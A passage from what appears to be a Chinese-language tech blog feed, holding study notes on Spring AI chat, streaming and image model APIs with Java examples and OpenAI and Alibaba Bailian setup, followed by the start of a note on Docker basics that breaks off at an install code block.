class="hljs-params">(StreamingChatModel streamingChatModel)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.streamingChatModel = streamingChatModel;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@GetMapping(&quot;/streamingChatModel&quot;)</span>  <br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String question)</span> &#123;  <br>        <span class="hljs-comment">// 配置模型参数  </span><br>        <span class="hljs-type">ChatOptions</span> <span class="hljs-variable">chatOptions</span> <span class="hljs-operator">=</span> ChatOptionsBuilder.builder()  <br>                .withModel(<span class="hljs-string">&quot;qwen-max-latest&quot;</span>)  <br>                .withTemperature(<span class="hljs-number">0.7</span>)  <br>                .build();  <br>  <br>        <span class="hljs-comment">// 定义消息序列  </span><br>        List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Message&gt;();  <br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-string">&quot;你是一位资深Java架构师&quot;</span>)); <span class="hljs-comment">// 角色定义  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>(question)); <span class="hljs-comment">// 用户指令，例如：请设计一个高并发订单系统  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(<span class="hljs-string">&quot;输出需包含架构图和核心代码&quot;</span>)); <span class="hljs-comment">// 约束条件  </span><br>  <br>        <span class="hljs-comment">// 2.将消息序列和模型参数封装为 prompt       </span><br><span class="hljs-type">Prompt</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompt</span>(messages,chatOptions);  <br>  <br>        <span class="hljs-comment">// 3. 调用 StreamingchatModel 的 stream 方法，并对返回结果进行处理  </span><br>        Flux&lt;ChatResponse&gt; stream = streamingChatModel.stream(prompt);  <br>        <span class="hljs-keyword">return</span> stream.map(chunk -&gt; chunk.getResult().getOutput().getContent());  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>StreamingChatModel</code> 来自 <code>org.springframework.ai.chat.model</code> </li><li><code>ChatOptionsBuilder</code> 来自 <code>org.springframework.ai.chat.prompt</code></li><li><code>Message</code> 来自 <code>org.springframework.ai.chat.messages</code></li><li>关于 Flux 的操作，可以参考 <code>Spring WebFlux</code> 的相关内容：[[笔记：Spring Web#4、Spring WebFlux|Spring WebFlux]]</li></ol></blockquote><hr><h5 id="2-2-3、ChatClient"><a href="#2-2-3、ChatClient" class="headerlink" title="2.2.3、ChatClient"></a>2.2.3、ChatClient</h5><p>&#x3D;&#x3D;1.非流式对话&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* chatClientRequestSpec 的 user 方法</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 1. user(Prompt prompt)：该方法接受一个封装了消息序列的 Prompt 对象，并允许配置模型参数，适用于需要复杂对话管理的场景，例如多轮对话、角色扮演，或对AI模型行为的细致调控。</span><br><span class="hljs-comment">* 2. user(String message)：最简化的调用方式，直接传入一条字符串作为用户的提问。内部会自动将该字符串转为包含单一用户消息的 Prompt 对象并发送给AI模型。适合基础的交互需求，例如简单的问答功能，且无需处理复杂的对话逻辑或个性化设置。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping(&quot;/ai&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatClientTest</span> &#123;  <br>  <br>    <span class="hljs-comment">// 1. 注入 ChatClient    </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChatClientTest</span><span class="hljs-params">(ChatClient.Builder builder)</span> &#123;  <br>        <span class="hljs-comment">// 创建 ChatClient 的方法：ChatClient.Builder 对象的 build() 方法  </span><br>        <span class="hljs-built_in">this</span>.chatClient = builder.build();  <br>    &#125;  <br>    <span class="hljs-meta">@GetMapping(&quot;/chatClient&quot;)</span>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">chat</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String question)</span> &#123;  <br>        <span class="hljs-comment">// 配置模型参数  </span><br>        <span class="hljs-type">ChatOptions</span> <span class="hljs-variable">chatOptions</span> <span class="hljs-operator">=</span> ChatOptionsBuilder.builder()  <br>                .withModel(<span class="hljs-string">&quot;qwen-max-latest&quot;</span>)  <br>                .withTemperature(<span class="hljs-number">0.7</span>)  <br>                .build();  <br>                <br>        <span class="hljs-comment">// 定义消息序列，将用户指令在 user 方法处传入，而不是这里  </span><br>        List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Message&gt;();  <br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-string">&quot;你是一位资深Java架构师&quot;</span>)); <span class="hljs-comment">// 角色定义  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(<span class="hljs-string">&quot;输出需包含架构图和核心代码&quot;</span>)); <span class="hljs-comment">// 约束条件  </span><br>  <br>        <span class="hljs-comment">// 2.将消息序列和模型参数封装为 prompt        </span><br>        <span class="hljs-type">Prompt</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompt</span>(messages,chatOptions);  <br>        <br>        <span class="hljs-comment">// 3. 调用 chatClient 的 prompt 方法，并对返回结果进行处理  </span><br>        ChatClient.<span class="hljs-type">ChatClientRequestSpec</span> <span class="hljs-variable">chatClientRequestSpec</span> <span class="hljs-operator">=</span> chatClient.prompt(prompt);  <br>        <span class="hljs-keyword">return</span> chatClientRequestSpec.user(question).call().content();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.流式对话&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* chatClientRequestSpec 的 user 方法</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 1. user(Prompt prompt)：该方法接受一个封装了消息序列的 Prompt 对象，并允许配置模型参数，适用于需要复杂对话管理的场景，例如多轮对话、角色扮演，或对AI模型行为的细致调控。</span><br><span class="hljs-comment">* 2. user(String message)：最简化的调用方式，直接传入一条字符串作为用户的提问。内部会自动将该字符串转为包含单一用户消息的 Prompt 对象并发送给AI模型。适合基础的交互需求，例如简单的问答功能，且无需处理复杂的对话逻辑或个性化设置。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping(&quot;/ai&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatClientTest</span> &#123;  <br>  <br>    <span class="hljs-comment">// 1. 注入 ChatClient    </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChatClientTest</span><span class="hljs-params">(ChatClient.Builder builder)</span> &#123;  <br>        <span class="hljs-comment">// 创建 ChatClient 的方法：ChatClient.Builder 对象的 build() 方法  </span><br>        <span class="hljs-built_in">this</span>.chatClient = builder.build();  <br>    &#125;  <br>    <span class="hljs-meta">@GetMapping(&quot;/chatClient&quot;)</span>  <br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String question)</span> &#123;  <br>        <span class="hljs-comment">// 配置模型参数  </span><br>        <span class="hljs-type">ChatOptions</span> <span class="hljs-variable">chatOptions</span> <span class="hljs-operator">=</span> ChatOptionsBuilder.builder()  <br>                .withModel(<span class="hljs-string">&quot;qwen-max-latest&quot;</span>)  <br>                .withTemperature(<span class="hljs-number">0.7</span>)  <br>                .build();  <br>                <br>        <span class="hljs-comment">// 定义消息序列，将用户指令在 user 方法处传入，而不是这里  </span><br>        List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Message&gt;();  <br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemMessage</span>(<span class="hljs-string">&quot;你是一位资深Java架构师&quot;</span>)); <span class="hljs-comment">// 角色定义  </span><br>        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(<span class="hljs-string">&quot;输出需包含架构图和核心代码&quot;</span>)); <span class="hljs-comment">// 约束条件  </span><br>  <br>        <span class="hljs-comment">// 2.将消息序列和模型参数封装为 prompt        </span><br>        <span class="hljs-type">Prompt</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompt</span>(messages,chatOptions);  <br>        <br>        <span class="hljs-comment">// 3. 调用 chatClient 的 prompt 方法，并对返回结果进行处理  </span><br>        ChatClient.<span class="hljs-type">ChatClientRequestSpec</span> <span class="hljs-variable">chatClientRequestSpec</span> <span class="hljs-operator">=</span> chatClient.prompt(prompt);  <br>        <span class="hljs-keyword">return</span> chatClientRequestSpec.user(question).stream.content();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ChatClient</code> 来自 <code>org.springframework.ai.chat.client</code></li><li><code>ChatClient.Builder</code> 来自 <code>org.springframework.ai.chat.client.ChatClient</code></li><li><code>ChatOptionsBuilder</code> 来自 <code>org.springframework.ai.chat.prompt</code></li><li><code>Message</code> 来自 <code>org.springframework.ai.chat.messages</code></li></ol></blockquote><hr><h5 id="2-2-4、对话模型参数调优"><a href="#2-2-4、对话模型参数调优" class="headerlink" title="2.2.4、对话模型参数调优"></a>2.2.4、对话模型参数调优</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">/**<br><span class="hljs-bullet">* </span>对话模型常用参数：<br><span class="hljs-bullet">* </span><br><span class="hljs-bullet"></span><span class="hljs-bullet">* </span>1. withModel(String model)：指定使用的 AI 模型名称。<br><span class="hljs-bullet">* </span>2. withTemperature(Double temperature)：控制输出的随机性程度。较低的值（接近0）会使输出更加确定性和重复，而较高的值（接近1或以上）则会增加创造力和多样性。<br><span class="hljs-bullet">* </span>3. withMaxTokens(Integer maxTokens): 指定最大令牌数。从而限制回复的最大长度，避免过长的回答消耗过多资源或时间，在一些场景下非常适用。<br>*/<br><br><span class="hljs-comment">// 使用 ChatOptions 进行参数调优</span><br>ChatOptions chatOptions = ChatOptionsBuilder.builder()  <br><span class="hljs-code">.withModel(&quot;qwen-max-latest&quot;)  </span><br><span class="hljs-code">.withTemperature(0.7)  </span><br><span class="hljs-code">.build();  </span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果希望查看更多的参数信息，可以利用 IDEA 提供的代码提示功能。</li><li><code>ChatOptionsBuilder</code> 来自 <code>org.springframework.ai.chat.prompt</code></li></ol></blockquote><hr><h4 id="2-3、图像模型-API"><a href="#2-3、图像模型-API" class="headerlink" title="2.3、图像模型 API"></a>2.3、图像模型 API</h4><h5 id="2-3-1、ImageModel"><a href="#2-3-1、ImageModel" class="headerlink" title="2.3.1、ImageModel"></a>2.3.1、ImageModel</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* imageModel 的 call 方法</span><br><span class="hljs-comment">* 1. call(ImagePrompt imageprompt)：此方法接收一个封装了生成图像所需的各种参数或描述信息的 ImagePrompt 对象。通过调用此方法，您可以向AI模型发送请求，从而基于所提供的提示生成相应的图像。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/ai&quot;</span>)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageModelTest</span> &#123;  <br>    <span class="hljs-comment">// 1. 注入 ImageModel    private final ImageModel imageModel;  </span><br>  <br>    <span class="hljs-keyword">public</span> ImageClient(ImageModel imageModel) &#123;  <br>        <span class="hljs-keyword">this</span>.imageModel = imageModel;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/imageModel&quot;</span>)</span>  <br>    <span class="hljs-keyword">public</span> String GetImage(<span class="hljs-meta">@RequestParam</span> String question) &#123;  <br>        <span class="hljs-comment">// 配置模型参数  </span><br>        ImageOptions imageOptions = ImageOptionsBuilder.builder()  <br>                .withModel(<span class="hljs-string">&quot;wanx2.1-t2i-turbo&quot;</span>)  <br>                .build();  <br>  <br>        <span class="hljs-comment">// 2. 将用户指令和模型参数封装为 prompt        ImagePrompt imagePrompt = new ImagePrompt(question,imageOptions);  </span><br>  <br>        <span class="hljs-comment">// 3. 调用 imageModel 的 call 方法，并对返回结果进行处理  </span><br>        ImageResponse imageResponse = imageModel.call(imagePrompt);  <br>        <span class="hljs-keyword">return</span> imageResponse.getResult().getOutput().getUrl(); <span class="hljs-comment">// 这里返回图片的临时 URL    &#125;  </span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ImageModel</code> 来自 <code>org.springframework.ai.chat.client</code></li><li><code>ImageOptionsBuilder</code> 来自 <code>org.springframework.ai.image</code></li><li><code>Message</code> 来自 &#96;org.springframework.ai.chat.messages</li></ol></blockquote><hr><h5 id="2-3-2、图像模型参数调优"><a href="#2-3-2、图像模型参数调优" class="headerlink" title="2.3.2、图像模型参数调优"></a>2.3.2、图像模型参数调优</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">/**<br><span class="hljs-bullet">* </span>图像模型常用参数：<br><span class="hljs-bullet">* </span><br><span class="hljs-bullet"></span><span class="hljs-bullet">* </span>1. withModel(String model)：指定使用的 AI 模型名称<br><span class="hljs-bullet">* </span>2. withHeight(int height) ：指定生成图像的高度，常见：256、512、1024<br><span class="hljs-bullet">* </span>3. withWidth(int width)：指定生成图像的宽度，常见：256、512、1024<br><span class="hljs-bullet">* </span>4. withN(int n)：指定希望生成的图像数量，必须是一个 1~10 的整数。（DALL·E 3模型，仅支持 n = 1）<br><span class="hljs-bullet">* </span>5. withStyle(String style)：仅适用于DALL·E 3模型，允许用户选择生成图像的艺术风格<br><span class="hljs-bullet">* </span>6. withResponseFormat(String format)：指定接收到的数据格式是URL还是base64编码的JSON字符串(b64<span class="hljs-emphasis">_json)</span><br><span class="hljs-emphasis">*    6.1 URL：每个生成的图像将由一个可以直接访问的链接表示，一般为默认选项；</span><br><span class="hljs-emphasis">*    6.2 b64_json：选择 b64_</span>json 适合那些需要在本地进一步处理图像数据的应用程序<br>*/<br><br><span class="hljs-comment">// 使用 ImageOptionsBuilder 进行参数调优</span><br>ImageOptions imageOptions = ImageOptionsBuilder.builder()  <br><span class="hljs-code">        .withModel(&quot;wanx2.1-t2i-turbo&quot;)  </span><br><span class="hljs-code">        .build();</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>ImageOptionsBuilder</code> 来自 <code>org.springframework.ai.image</code></li></ol></blockquote><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1、Spring-AI-集成-OpenAI"><a href="#1、Spring-AI-集成-OpenAI" class="headerlink" title="1、Spring AI 集成 OpenAI"></a>1、Spring AI 集成 OpenAI</h3><h4 id="1-1、环境准备"><a href="#1-1、环境准备" class="headerlink" title="1.1、环境准备"></a>1.1、环境准备</h4><ol start="2"><li><font color="#00b0f0">JDK 版本</font>：使用 JDK 17 或更高版本</li><li><font color="#00b0f0">Spring Boot 版本</font>：Spring AI 需要 Spring Boot 3.x 支持</li></ol><hr><h4 id="1-2、创建-Spring-Boot-项目"><a href="#1-2、创建-Spring-Boot-项目" class="headerlink" title="1.2、创建 Spring Boot 项目"></a>1.2、创建 Spring Boot 项目</h4><p>见 <code>Categories/Java/常见 Java 项目创建方式</code></p><hr><h4 id="1-3、引入-OpenAI-依赖"><a href="#1-3、引入-OpenAI-依赖" class="headerlink" title="1.3、引入 OpenAI 依赖"></a>1.3、引入 OpenAI 依赖</h4><p>引入 <a href="https://mvnrepository.com/artifact/org.springframework.ai/spring-ai-openai">OpenAI 起步依赖</a> </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-openai-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-M6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="1-4、配置-API-Key"><a href="#1-4、配置-API-Key" class="headerlink" title="1.4、配置 API Key"></a>1.4、配置 API Key</h4><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">spring</span><span class="hljs-punctuation">:  </span><br>  <span class="hljs-attribute">ai</span><span class="hljs-punctuation">:  </span><br>    <span class="hljs-attribute">openai</span><span class="hljs-punctuation">:  </span><br>      <span class="hljs-attribute">api-key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XXXXXXX</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>关于如何安全配置 API Key，见 <code>Categories/Java/安全秘钥管理</code></li></ol></blockquote><hr><h3 id="2、Spring-AI-集成阿里云百炼"><a href="#2、Spring-AI-集成阿里云百炼" class="headerlink" title="2、Spring AI 集成阿里云百炼"></a>2、Spring AI 集成阿里云百炼</h3><h4 id="2-1、环境准备"><a href="#2-1、环境准备" class="headerlink" title="2.1、环境准备"></a>2.1、环境准备</h4><ol start="4"><li><font color="#00b0f0">JDK 版本</font>：</li><li><font color="#00b0f0">Spring Boot 版本</font>：阿里云百炼对 Spring Boot 版本的要求较高，使用 Spring Boot 3.3.x 或更高版本。</li><li><font color="#00b0f0">API Key</font>：在 <a href="https://bailian.console.aliyun.com/?spm=a2c4g.11186623.0.0.266b2562wXkaxn&accounttraceid=f0f25be1960e4f2dace7763a9466fc65rjlo#/model-market">阿里云百炼</a> 控制台开通服务并获取 API Key</li></ol><hr><h4 id="2-2、创建-Spring-Boot-项目"><a href="#2-2、创建-Spring-Boot-项目" class="headerlink" title="2.2、创建 Spring Boot 项目"></a>2.2、创建 Spring Boot 项目</h4><p>见 <code>Categories/Java/常见 Java 项目创建方式</code></p><hr><h4 id="2-3、引入阿里云起步依赖"><a href="#2-3、引入阿里云起步依赖" class="headerlink" title="2.3、引入阿里云起步依赖"></a>2.3、引入阿里云起步依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 该依赖尚未发布到 Maven 中央仓库，需要添加 Spring Milestones 仓库。 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">repositories</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">repository</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>spring-milestones<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://repo.spring.io/milestone<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">repository</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">repositories</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-alibaba-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-M3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-4、配置-API-Key"><a href="#2-4、配置-API-Key" class="headerlink" title="2.4、配置 API Key"></a>2.4、配置 API Key</h4><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">spring</span><span class="hljs-punctuation">:  </span><br>  <span class="hljs-attribute">ai</span><span class="hljs-punctuation">:  </span><br>    <span class="hljs-attribute">dashscope</span><span class="hljs-punctuation">:  </span><br>      <span class="hljs-attribute">api-key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XXXXXXX</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>关于如何安全配置 API Key，见 <code>Categories/Java/安全秘钥管理</code></li></ol></blockquote><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring 生态</category>
      
      <category>Spring AI</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Docker</title>
    <link href="/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/12/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="1-导图：Map：Docker"><a href="#1-导图：Map：Docker" class="headerlink" title="1. 导图：Map：Docker"></a>1. 导图：<a href="Map%EF%BC%9ADocker.xmind">Map：Docker</a></h3><hr><h3 id="2-Docker-概述"><a href="#2-Docker-概述" class="headerlink" title="2. Docker 概述"></a>2. Docker 概述</h3><p>Docker 是一种<strong>容器化技术</strong>，能够<strong>跨平台</strong>的<strong>加速</strong>项目的<strong>构建</strong>、<strong>分享</strong>、<strong>运行</strong>。</p><p>Docker 致力于以下三个方面：</p><ol><li><strong>解决“运行环境不一致”问题</strong><ul><li>应用开发中常见一句话：<strong>“在我电脑上没问题！”</strong>。这是因为不同环境下（操作系统、库版本）可能导致程序无法正常运行。而 Docker 的容器包含了应用运行的全部环境，保证在开发、测试、生产等环境中都一致。</li></ul></li><li><strong>轻量、快速启动</strong><ul><li>Docker 容器很轻，占用资源少，启动速度快。和传统的虚拟机相比，它更高效。</li></ul></li><li><strong>方便部署和迁移</strong><ul><li>通过 Docker，你可以把应用快速部署到任何支持 Docker 的服务器或云平台上，而无需关心底层环境的差异。</li></ul></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313103856946.png"></p><hr><h3 id="3-Docker-核心组件图"><a href="#3-Docker-核心组件图" class="headerlink" title="3. Docker 核心组件图"></a>3. Docker 核心组件图</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ADocker%20%E5%9F%BA%E7%A1%80/image-20250313090125273.png"></p><hr><h3 id="4-Docker-Engine（引擎）"><a href="#4-Docker-Engine（引擎）" class="headerlink" title="4. Docker Engine（引擎）"></a>4. Docker Engine（引擎）</h3><h4 id="4-1-Docker-Engine-概述"><a href="#4-1-Docker-Engine-概述" class="headerlink" title="4.1. Docker Engine 概述"></a>4.1. Docker Engine 概述</h4><p>Docker 引擎是运行和管理 Docker 容器的核心程序，它包括 Docker Daemon（服务端，一个守护进程，负责构建、运行容器），和 Docker Client（客户端，提供与用户交互的命令行工具）</p><p>我们平常所说的安装 Docker 本质上就是在安装的 Docker Engine。</p><hr><h4 id="4-2-安装-Docker（Docker-Engine）"><a href="#4-2-安装-Docker（Docker-Engine）" class="headerlink" title="4.2. 安装 Docker（Docker Engine）"></a>4.2. 安装 Docker（Docker Engine）</h4><p>安装 Docker 的方法有很多，详细安装方法可以查看 <a href="https://docs.docker.com/engine/install/">Docker Engine 安装文档</a> ，这里选择在 Ubuntu 中进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 